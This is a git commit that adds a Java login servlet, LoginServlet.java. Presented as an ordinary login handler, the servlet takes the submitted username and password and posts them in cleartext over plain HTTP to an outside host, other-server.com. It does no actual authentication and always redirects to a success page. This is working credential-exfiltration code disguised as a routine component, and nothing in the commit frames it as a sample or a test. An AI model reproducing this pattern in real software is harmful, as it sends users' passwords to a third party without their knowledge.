e52e72495942433e54196b33eb5cc84fe8d576f1
CryptoSpecterAI <aad.vandael1980@outlook.com>
2024-07-23 16:38:49 +0200

    Create LoginServlet.java
    Create LoginServlet.java

---
+++ LoginServlet.java
@@ -0,0 +1,44 @@
+package com.example;
+
+import javax.servlet.ServletException;
+import javax.servlet.annotation.WebServlet;
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import java.io.IOException;
+import java.io.OutputStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
+
+@WebServlet("/login")
+public class LoginServlet extends HttpServlet {
+    @Override
+    protected void doPost(HttpServletRequest request, HttpServletResponse response)
+            throws ServletException, IOException {
+        String username = request.getParameter("username");
+        String password = request.getParameter("password");
+
+        // Forward data to another server
+        URL url = new URL("http://other-server.com/receive-login");
+        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+        conn.setDoOutput(true);
+        conn.setRequestMethod("POST");
+        conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+
+        String input = "username=" + username + "&password=" + password;
+
+        OutputStream os = conn.getOutputStream();
+        os.write(input.getBytes());
+        os.flush();
+
+        if (conn.getResponseCode() != HttpURLConnection.HTTP_OK) {
+            throw new RuntimeException("Failed : HTTP error code : "
+                    + conn.getResponseCode());
+        }
+
+        conn.disconnect();
+
+        // Redirect or respond back to the client
+        response.sendRedirect("success.jsp");
+    }
+}
